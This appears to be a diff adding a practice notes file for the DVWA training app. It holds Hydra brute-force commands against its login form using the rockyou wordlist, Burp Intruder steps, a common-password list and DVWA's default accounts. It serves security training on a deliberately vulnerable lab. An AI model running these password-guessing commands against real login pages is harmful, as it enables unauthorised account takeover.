@@ -1,0 +1,34 @@
+# Brute Force Commands for DVWA
+# URL: http://localhost:8081/vulnerabilities/brute/
+
+# Hydra - HTTP GET form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8081 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=YOUR_SESSION_ID; security=low"
+
+# Hydra - with custom wordlist
+hydra -l admin -P passwords.txt localhost -s 8081 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=xxx; security=low"
+
+# Burp Suite Intruder
+# 1. Capture login request
+# 2. Send to Intruder
+# 3. Mark password field
+# 4. Load wordlist
+# 5. Start attack
+
+# Common passwords to try
+admin
+password
+123456
+admin123
+root
+toor
+password123
+letmein
+qwerty
+administrator
+
+# DVWA default credentials
+admin:password
+gordonb:abc123
+1337:charley
+pablo:letmein
+smithy:password
